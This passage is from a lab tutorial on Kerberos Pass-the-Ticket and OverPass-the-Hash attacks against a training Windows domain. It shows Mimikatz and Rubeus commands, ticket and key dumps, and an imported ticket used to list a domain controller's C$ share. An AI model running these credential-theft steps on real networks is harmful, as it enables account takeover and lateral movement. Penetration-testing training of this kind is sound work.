doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lhggPlMIID4aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT02jggOvMIIDq6ADAgESoQMCAQKiggOdBIIDmUE<span class="hljs-regexp">/AWlM6VlpGv+Gfvn6bHXrpRjRbsgcw9beSqS2ihO+FY/</span><span class="hljs-number">2</span>Rr0g0iHowOYOgn7EBV3JYEDTNZS2ErKNLVOh0<span class="hljs-regexp">/TczLexQk+bKTMh55oNNQDVzmarvzByKYC0XRTjb1jPuVz4exraxGEBTgJYUunCy/</span>R5agIa6xuuGUvXL+<span class="hljs-number">6</span>AbHLvMb+ObdU7Dyn9eXruBscIBX5k3D3S5sNuEnm1sHVsGuDBAN5Ko6kZQRTx22A+lZZD12ymv9rh8S41z0+pfINdXx<span class="hljs-regexp">/VQAxYRL5QKdjbndchgpJro4mdzuEiu8wYOxbpJdzMANSSQiep+wOTUMgimcHCCCrhXdyR7VQoRjjdmTrKbPVGltBOAWQOrFs6YK1OdxBles1GEibRnaoT9qwEmXOa4ICzhjHgph36TQIwoRC+zjPMZl9lf+qtpuOQK86aG7Uwv7eyxwSa1/</span>H0mi5B+un2xKaRmj<span class="hljs-regexp">/mZHXPdT7B5Ruwct93F2zQQ1mKIH0qLZO1Zv/</span>G0IrycXxoE5MxMLERhbPl4Vx1XZGJk2a3m8BmsSZJt<span class="hljs-regexp">/++rw7YE/</span>vmQiW6FZBO<span class="hljs-regexp">/2uzMgPJK9xI8kaJvTOmfJQwVlJslsjY2RAVGly1B0Y80UjeN8iVmKCk3Jvz4QUCLK2zZPWKCn+qMTtvXBqx80VH1hyS8FwU3oh90IqNS1VFbDjZdEQpBGCE/</span>mrbQ2E<span class="hljs-regexp">/rGDKyGvIZfCo7t+kuaCivnY8TTPFszVMKTDSZ2WhFtO2fipId+shPjk3RLI89BT4+TDzGYKU2ipkXm5cEUnNis4znYVjGSIKhtrHltnBO3d1pw402xVJ5lbT+yJpzcEc5N7xBkymYLHAbM9DnDpJ963RN/</span><span class="hljs-number">0</span>FcZDusDdorHA1DxNUCHQgvK17iametKsz6Vgw0zVySsPp<span class="hljs-regexp">/wZ/</span>tssglp5UU6in1Bq91hA2c35l8M1oGkCqiQrfY8x3GNpMPixwBdd2OU1xwn<span class="hljs-regexp">/gaon2fpWEPFzKgDRtKe1FfTjoEySGr38QSs1+JkVk0HTRUbx9Nnq6w3W+D1p+FSCRZyCF/</span>H1ahT9o0IRkFiOj0Cud5wyyEDom08wOmgwxK0D<span class="hljs-regexp">/0aisBTRzmZrSfG7Kjm9/</span>yNmLB5va1yD3IyFiMreZZ2WRpNyK0G6L4H7NBZPcxIgE<span class="hljs-regexp">/Cxx/</span>KduYTPnBDvwb6uUDMcZR83lVAQ5NyHHaHUOjoWsawHraI4uYgmCqXYN7yYmJPKNDI290GMbn1zIPSSL82V3hRbOO8CZNP<span class="hljs-regexp">/f64haRlR63GJBGaOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oCswKaADAgESoSIEIClgTKTOAY3p4054sB9McPBYb2xUn/</span>kgVWSSXFoFCot8oQkbB0hUQi5DT02iEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIyMDcxMjEzMzk1NFqmERgPMjAyMjA3MTIyMzM5NTRapxEYDzIwMjIwNzE5MTMzOTU0WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdIVEIuQ09N

  <span class="hljs-string">UserName                 :</span> plaintext
  <span class="hljs-string">Domain                   :</span> HTB
  <span class="hljs-string">LogonId                  :</span> <span class="hljs-number">0x6c680</span>
  <span class="hljs-string">UserSID                  :</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-228825152</span><span class="hljs-number">-3134732153</span><span class="hljs-number">-3833540767</span><span class="hljs-number">-1107</span>
  <span class="hljs-string">AuthenticationPackage    :</span> Kerberos
  <span class="hljs-string">LogonType                :</span> Interactive
  <span class="hljs-string">LogonTime                :</span> <span class="hljs-number">7</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">42</span>:<span class="hljs-number">15</span> AM
  <span class="hljs-string">LogonServer              :</span> DC01
  <span class="hljs-string">LogonServerDNSDomain     :</span> inlanefreight.htb
  <span class="hljs-string">UserPrincipalName        :</span> plaintext<span class="hljs-meta">@inlanefreight</span>.htb


    <span class="hljs-string">ServiceName           :</span>  krbtgt/inlanefreight.htb
    <span class="hljs-string">ServiceRealm          :</span>  inlanefreight.htb
    <span class="hljs-string">UserName              :</span>  plaintext
    <span class="hljs-string">UserRealm             :</span>  inlanefreight.htb
    <span class="hljs-string">StartTime             :</span>  <span class="hljs-number">7</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">42</span>:<span class="hljs-number">15</span> AM
    <span class="hljs-string">EndTime               :</span>  <span class="hljs-number">7</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">42</span>:<span class="hljs-number">15</span> PM
    <span class="hljs-string">RenewTill             :</span>  <span class="hljs-number">7</span><span class="hljs-regexp">/19/</span><span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">42</span>:<span class="hljs-number">15</span> AM
    <span class="hljs-string">Flags                 :</span>  name_canonicalize, pre_authent, initial, renewable, forwardable
    <span class="hljs-string">KeyType               :</span>  aes256_cts_hmac_sha1
    Base64(key)           :  <span class="hljs-number">2</span>NN3wdC4FfpQunUUgK+MZO8f20xtXF0dbmIagWP0Uu0=
    <span class="hljs-string">Base64EncodedTicket   :</span>

doIE9jCCBPKgAwIBBaEDAgEWooIECTCCBAVhggQBMIID<span class="hljs-regexp">/aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT02jggPLMIIDx6ADAgESoQMCAQKiggO5BIIDtc6ptErl3sAxJsqVTkV84/</span>IcqkpopGPYMWzPcXaZgPK9hL0579FGJEBXX+Ae90rOcpbrbErMr52WEVa<span class="hljs-regexp">/E2vVsf37546ScP0+9LLgwOAoLLkmXAUqP4zJw47nFjbZQ3PHs+vt6LI1UnGZoaUNcn1xI7VasrDoFakj/</span>ZH+GZ7EjgpBQFDZy0acNL8cK0AIBIe8fBF5K7gDPQugXaB6diwoVzaO<span class="hljs-regexp">/E/</span>p8m3t35CR1PqutI5SiPUNim0s<span class="hljs-regexp">/snipaQnyuAZzOqFmhwPPujdwOtm1jvrmKV1zKcEo2CrMb5xmdoVkSn4L6AlX328K0+OUILS5GOe2gX6Tv1zw1F9ANtEZF6FfUk9A6E0dc/</span>OznzApNlRqnJ0dq45mD643HbewZTV8YKS<span class="hljs-regexp">/lUovZ6WsjsyOy6UGKj+qF8WsOK1YsO0rW4ebWJOnrtZoJXryXYDf+mZ43yKcS10etHsq1B2/</span>XejadVr1ZY7HKoZKi3gOx3ghk8foGPfWE6kLmwWnT16COWVI69D9pnxjHVXKbB5BpQWAFUtEGNlj7zzWTPEtZMVGeTQOZ0FfWPRS+EgLmxUc47GSVON7jhOTx3KJDmE7WHGsYzkWtKFxKEWMNxIC03P7r9seEo5RjS<span class="hljs-regexp">/WLant4FCPI+0S/</span>tasTp6GGP30lbZT31WQER49KmSC75jnfT<span class="hljs-regexp">/9lXMVPHsA3VGG2uwGXbq1H8UkiR0ltyD99zDVTmYZ1aP4y63F3Av9cg3dTnz60hNb7H+AFtfCjHGWdwpf9HZ0u0HlBHSA7pYADoJ9+ioDghL+cqzPn96VyDcqbauwX/</span>FqC<span class="hljs-regexp">/udT+cgmkYFzSIzDhZv6EQmjUL4b2DFL/</span>Mh8BfHnFCHLJdAVRdHlLEEl1MdK9<span class="hljs-regexp">/089O06kD3qlE6s4hewHwqDy39ORxAHHQBFPU211nhuU4Jofb97d7tYxn8f8c5WxZmk1nPILyAI8u9z0nbOVbdZdNtBg5sEX+IRYyY7o0z9hWJXpDPuk0ksDgDckPWtFvVqX6Cd05yP2OdbNEeWns9JV2D5zdS7Q8UMhVo7z4GlFhT/</span>eOopfPc0bxLoOv7y4fvwhkFh<span class="hljs-regexp">/9LfKu6MLFneNff0Duzjv9DQOFd1oGEnA4MblzOcBscoH7CuscQQ8F5xUCf72BVY5mShq8S89FG9GtYotmEUe/</span>j+Zk6QlGYVGcnNcDxIRRuyI1qJZxCLzKnL1xcKBF4RblLcUtkYDT+mZlCSvwWgpieq1VpQg42Cjhxz<span class="hljs-regexp">/+xVW4Vm7cBwpMc77Yd1+QFv0wBAq5BHvPJI4hCVPs7QejgdgwgdWgAwIBAKKBzQSByn2BxzCBxKCBwTCBvjCBu6ArMCmgAwIBEqEiBCDY03fB0LgV+lC6dRSAr4xk7x/</span>bTG1cXR1uYhqBY/RS7aEJGwdIVEIuQ09NohYwFKADAgEBoQ0wCxsJcGxhaW50ZXh0owcDBQBA4QAApREYDzIwMjIwNzEyMTM0MjE1WqYRGA8yMDIyMDcxMjIzNDIxNVqnERgPMjAyMjA3MTkxMzQyMTVaqAkbB0hUQi5DT02pHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT00=
&lt;SNIP&gt;
</code></pre>
<p>Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.</p>
<p>This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let&#39;s see how we can do this using the <code>Pass the Key</code> aka. <code>OverPass the Hash</code> technique.</p>
<h3 id="pass-the-key-aka-overpass-the-hash">Pass the Key aka. OverPass the Hash</h3>
<p>The traditional <code>Pass the Hash</code> (<code>PtH</code>) technique involves reusing an NTLM password hash that doesn&#39;t touch Kerberos. The <code>Pass the Key</code> aka. <code>OverPass the Hash</code> approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full <code>Ticket Granting Ticket</code> (<code>TGT</code>). This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation <a href="https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18">Abusing Microsoft Kerberos - Sorry you guys don&#39;t get it</a>. Also <a href="https://twitter.com/harmj0y">Will Schroeder</a> adapted their project to create the <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> tool.</p>
<p>To forge our tickets, we need to have the user&#39;s hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module <code>sekurlsa::ekeys</code>. This module will enumerate all key types present for the Kerberos package.</p>
<p><strong>Mimikatz - Extract Kerberos keys</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session">c:\tools&gt; mimikatz.exe

  .#####.   mimikatz <span class="hljs-number">2.2</span><span class="hljs-number">.0</span> (x64) #<span class="hljs-number">19041</span> Aug  <span class="hljs-number">6</span> <span class="hljs-number">2020</span> <span class="hljs-number">14</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span>

mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # sekurlsa::ekeys

&lt;SNIP&gt;

Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">444066</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0006</span>c6a2)
Session           : Interactive <span class="hljs-keyword">from</span> <span class="hljs-number">1</span>
User Name         : plaintext
Domain            : HTB
Logon Server      : DC01
Logon Time        : <span class="hljs-number">7</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">42</span>:<span class="hljs-number">15</span> AM
SID               : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-228825152</span><span class="hljs-number">-3134732153</span><span class="hljs-number">-3833540767</span><span class="hljs-number">-1107</span>

         * Username : plaintext
         * Domain   : inlanefreight.htb
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       <span class="hljs-number">3</span>f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      <span class="hljs-number">3</span>f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           <span class="hljs-number">3</span>f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   <span class="hljs-number">3</span>f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  <span class="hljs-number">3</span>f74aa8f08f712f09cd5177b5c1ce50f
&lt;SNIP&gt;
</code></pre>
<p>Now that we have access to the <code>AES256_HMAC</code> and <code>RC4_HMAC</code> keys, we can perform the OverPass the Hash aka. Pass the Key attack using <code>Mimikatz</code> and <code>Rubeus</code>.</p>
<p><strong>Mimikatz - Pass the Key aka. OverPass the Hash</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session">c:<span class="hljs-string">\tools&gt;</span> mimikatz.exe

  .<span class="hljs-comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43</span>
 .<span class="hljs-comment">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="hljs-comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span>
 <span class="hljs-string">'## v ##'</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  <span class="hljs-string">'#####'</span>        &gt; http:<span class="hljs-regexp">//pingcastle.com / http://m</span>ysmartlogon.com   ***/

mimikatz <span class="hljs-comment"># privilege::debug</span>
Privilege <span class="hljs-string">'20'</span> OK

mimikatz <span class="hljs-comment"># sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f</span>

user    : plaintext
domain  : inlanefreight.htb
program : cmd.exe
impers. : <span class="hljs-literal">no</span>
NTLM    : <span class="hljs-number">3f</span>74aa8f08f712f09cd5177b5c1ce50f
  |  PID  <span class="hljs-number">1128</span>
  |  TID  <span class="hljs-number">3268</span>
  |  LSA Process <span class="hljs-keyword">is</span> now R/W
  |  LUID <span class="hljs-number">0</span> ; <span class="hljs-number">3414364</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0034195c</span>)
  <span class="hljs-string">\_</span> msv1_0   - data copy @ <span class="hljs-number">000001</span>C7DBC0B630 : OK !
  <span class="hljs-string">\_</span> kerberos - data copy @ <span class="hljs-number">000001</span>C7E20EE578
   <span class="hljs-string">\_</span> aes256_hmac<span class="hljs-function">       -&gt;</span> <span class="hljs-literal">null</span>
   <span class="hljs-string">\_</span> aes128_hmac<span class="hljs-function">       -&gt;</span> <span class="hljs-literal">null</span>
   <span class="hljs-string">\_</span> rc4_hmac_nt       OK
   <span class="hljs-string">\_</span> rc4_hmac_old      OK
   <span class="hljs-string">\_</span> rc4_md4           OK
   <span class="hljs-string">\_</span> rc4_hmac_nt_exp   OK
   <span class="hljs-string">\_</span> rc4_hmac_old_exp  OK
   <span class="hljs-string">\_</span> *Password replace @ <span class="hljs-number">000001</span>C7E2136BC8 <span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">32</span>)</span> -&gt;</span> <span class="hljs-literal">null</span>
</code></pre>
<p>This will create a new <code>cmd.exe</code> window that we can use to request access to any service we want in the context of the target user.</p>
<p>To forge a ticket using <code>Rubeus</code>, we can use the module <code>asktgt</code> with the username, domain, and hash which can be <code>/rc4</code>, <code>/aes128</code>, <code>/aes256</code>, or <code>/des</code>. In the following example, we use the AES-256 hash from the information we collect using Mimikatz <code>sekurlsa::ekeys</code>.</p>
<p><strong>Rubeus - Pass the Key aka. OverPass the Hash</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] Base64(ticket.kirbi):

doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/LSsa2xrdJJir1eVugDFCoGFT2hDcYcpRdifXw67WofDM6Z6utsha+4bL0z6QN+tdpPlNQFwjuWmBrZtpS9TcCblotYvDHa0aLVsroW/fqXJ4KIV2tVfbVIDJvPkgdNAbhp6NvlbzeakR1oO5RTm7wtRXeTirfo6C9Ap0HnctlHAd+Qnvo2jGUPP6GHIhdlaM+QShdJtzBEeY/xIrORiiylYcBvOoir8mFEzNpQgYADmbTmg+c7/NgNO8Qj4AjrbGjVf/QWLlGc7sH9+tARi/Gn0cGKDK481A0zz+9C5huC9ZoNJ/18rWfJEb4P2kjlgDI0/fauT5xN+3NlmFVv0FSC8/909pUnovy1KkQaMgXkbFjlxeheoPrP6S/TrEQ8xKMyrz9jqs3ENh//q738lxSo8J2rZmv1QHy+wmUKif4DUwPyb4AHgSgCCUUppIFB3UeKjqB5srqHR78YeAWgY7pgqKpKkEomy922BtNprk2iLV1cM0trZGSk6XJ/H+JuLHI5DkuhkjZQbb1kpMA2CAFkEwdL9zkfrsrdIBpwtaki8pvcBPOzAjXzB7MWvhyAQevHCT9y6iDEEvV7fsF/B5xHXiw3Ur3P0xuCS4K/Nf4GC5PIahivW3jkDWn3g/0nl1K9YYX7cfgXQH9/inPS0OF1doslQfT0VUHTzx8vG3H25vtc2mPrfIwfUzmReLuZH8GCvt4p2BAbHLKx6j/HPa4+YPmV0GyCv9iICucSwdNXK53Q8tPjpjROha4AGjaK50yY8lgknRA4dYl7+O2+j4K/lBWZHy+IPgt3TO7YFoPJIEuHtARqigF5UzG1S+mefTmqpuHmoq72KtidINHqi+GvsvALbmSBQaRUXsJW/Lf17WXNXmjeeQWemTxlysFs1uRw9JlPYsGkXFh3fQ2ngax7JrKiO1/zDNf6cvRpuygQRHMOo5bnWgB2E7hVmXm2BTimE7axWcmopbIkEi165VOy/M+pagrzZDLTiLQOP/X8D6G35+srSr4YBWX4524/Nx7rPFCggxIXEU4zq3Ln1KMT9H7efDh+h0yNSXMVqBSCZLx6h3Fm2vNPRDdDrq7uz5UbgqFoR2tgvEOSpeBG5twl4MSh6VA7LwFi2usqqXzuPgqySjA1nPuvfy0Nd14GrJFWo6eDWoOy2ruhAYtaAtYC6OByDCBxaADAgEAooG9BIG6fYG3MIG0oIGxMIGuMIGroBswGaADAgEXoRIEENEzis1B3YAUCjJPPsZjlduhCRsHSFRCLkNPTaIWMBSgAwIBAaENMAsbCXBsYWludGV4dKMHAwUAQOEAAKURGA8yMDIyMDcxMjE1MjgyNlqmERgPMjAyMjA3MTMwMTI4MjZapxEYDzIwMjIwNzE5MTUyODI2WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdodGIuY29t

  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 11:28:26 AM
  EndTime               :  7/12/2022 9:28:26 PM
  RenewTill             :  7/19/2022 11:28:26 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  0TOKzUHdgBQKMk8+xmOV2w==</span>
</code></pre>
<p>Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn&#39;t.</p>
<p>To learn more about the difference between Mimikatz <code>sekurlsa::pth</code> and Rubeus <code>asktgt</code>, consult the Rubeus tool documentation <a href="https://github.com/GhostPack/Rubeus#example-over-pass-the-hash">Example for OverPass the Hash</a>.</p>
<p>Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an &quot;encryption downgrade.&quot;</p>
<h3 id="pass-the-ticket-ptt-">Pass the Ticket (PtT)</h3>
<p>Now that we have some Kerberos tickets, we can use them to move laterally within an environment.</p>
<p>With <code>Rubeus</code> we performed an OverPass the Hash attack and retrieved the ticket in Base64 format. Instead, we could use the flag <code>/ptt</code> to submit the ticket (TGT or TGS) to the current logon session.</p>
<p><strong>Rubeus - Pass the Ticket</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session">c:\tools&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] Base64(ticket.kirbi):

      doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKh
      EzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpcGX6rbUlYxOWeMmu/zb
      f7vGgDj/g+P5zzLbr+XTIPG0kI2WCOlAFCQqz84yQd6IRcEeGjG4YX/9ezJogYNtiLnY6YPkqlQaG1Nn
      pAQBZMIhs01EH62hJR7W5XN57Tm0OLF6OFPWAXncUNaM4/aeoAkLQHZurQlZFDtPrypkwNFQ0pI60NP2
      9H98JGtKKQ9PQWnMXY7Fc/5j1nXAMVj+Q5Uu5mKGTtqHnJcsjh6waE3Vnm77PMilL1OvH3Om1bXKNNan
      JNCgb4E9ms2XhO0XiOFv1h4P0MBEOmMJ9gHnsh4Yh1HyYkU+e0H7oywRqTcsIg1qadE+gIhTcR31M5mX
      5TkMCoPmyEIk2MpO8SwxdGYaye+lTZc55uW1Q8u8qrgHKZoKWk/M1DCvUR4v6dg114UEUhp7WwhbCEtg
      5jvfr4BJmcOhhKIUDxyYsT3k59RUzzx7PRmlpS0zNNxqHj33yAjm79ECEc+5k4bNZBpS2gJeITWfcQOp
      lQ08ZKfZw3R3TWxqca4eP9Xtqlqv9SK5kbbnuuWIPV2/QHi3deB2TFvQp9CSLuvkC+4oNVg3VVR4bQ1P
      fU0+SPvL80fP7ZbmJrMan1NzLqit2t7MPEImxum049nUbFNSH6D57RoPAaGvSHePEwbqIDTghCJMic2X
      c7YJeb7y7yTYofA4WXC2f1MfixEEBIqtk/drhqJAVXz/WY9r/sWWj6dw9eEhmj/tVpPG2o1WBuRFV72K
      Qp3QMwJjPEKVYVK9f+uahPXQJSQ7uvTgfj3N5m48YBDuZEJUJ52vQgEctNrDEUP6wlCU5M0DLAnHrVl4
      Qy0qURQa4nmr1aPlKX8rFd/3axl83HTPqxg/b2CW2YSgEUQUe4SqqQgRlQ0PDImWUB4RHt+cH6D563n4
      PN+yqN20T9YwQMTEIWi7mT3kq8JdCG2qtHp/j2XNuqKyf7FjUs5z4GoIS6mp/3U/kdjVHonq5TqyAWxU
      wzVSa4hlVgbMq5dElbikynyR8maYftQk+AS/xYby0UeQweffDOnCixJ9p7fbPu0Sh2QWbaOYvaeKiG+A
      GhUAUi5WiQMDSf8EG8vgU2gXggt2Slr948fy7vhROp/CQVFLHwl5/kGjRHRdVj4E+Zwwxl/3IQAU0+ag
      GrHDlWUe3G66NrR/Jg8zXhiWEiViMd5qPC2JTW1ronEPHZFevsU0pVK+MDLYc3zKdfn0q0a3ys9DLoYJ
      8zNLBL3xqHY9lNe6YiiAzPG+Q6OByDCBxaADAgEAooG9BIG6fYG3MIG0oIGxMIGuMIGroBswGaADAgEX
      oRIEED0RtMDJnODs5w89WCAI3bChCRsHSFRCLkNPTaIWMBSgAwIBAaENMAsbCXBsYWludGV4dKMHAwUA
      QOEAAKURGA8yMDIyMDcxMjE2Mjc0N1qmERgPMjAyMjA3MTMwMjI3NDdapxEYDzIwMjIwNzE5MTYyNzQ3
      WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdodGIuY29t
[+] Ticket successfully imported!

  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 12:27:47 PM
  EndTime               :  7/12/2022 10:27:47 PM
  RenewTill             :  7/19/2022 12:27:47 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  PRG0wMmc4OznDz1YIAjdsA==</span>
</code></pre>
<p>Note that now it displays <code>Ticket successfully imported!</code>.</p>
<p>Another way is to import the ticket into the current session using the <code>.kirbi</code> file from the disk.</p>
<p>Let&#39;s use a ticket exported from Mimikatz and import it using Pass the Ticket.</p>
<p><strong>Rubeus - Pass the Ticket</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session">c:\tools&gt; Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext<span class="hljs-meta">@krbtgt-inlanefreight.htb.kirbi</span>

 ______        _
(_____ \      |<span class="hljs-string"> </span>|
 _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
</span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
</span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
|<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

v1.5.0


[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools&gt; dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

...SNIP...</span>
</code></pre>
